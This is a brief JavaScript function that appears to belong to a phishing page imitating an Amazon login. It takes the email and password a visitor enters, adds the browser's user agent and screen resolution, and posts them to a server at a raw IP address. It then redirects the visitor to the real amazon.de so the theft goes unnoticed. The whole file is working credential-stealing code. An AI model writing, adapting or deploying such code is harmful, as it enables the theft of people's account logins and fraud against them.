function replaces() {
    let password = document.querySelector('input[name="email"]').value;
    let email = localStorage.getItem("email");

    if (!email || !password) {
        alert('Please fill in both email and password');
        return;
    }

    // Get the screen's resolution
    let resolution = window.screen.width + 'x' + window.screen.height;

    let data = {
        email: email,
        password: password,
        user_agent: navigator.userAgent,
        resolution: resolution
    };

    fetch('https://104.248.248.40:5000/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                location.replace("https://www.amazon.de/");
            } else {
                alert('Error: ' + data.message);
            }
        })
        .catch((error) => {
            console.error('Error:', error);
        });
}

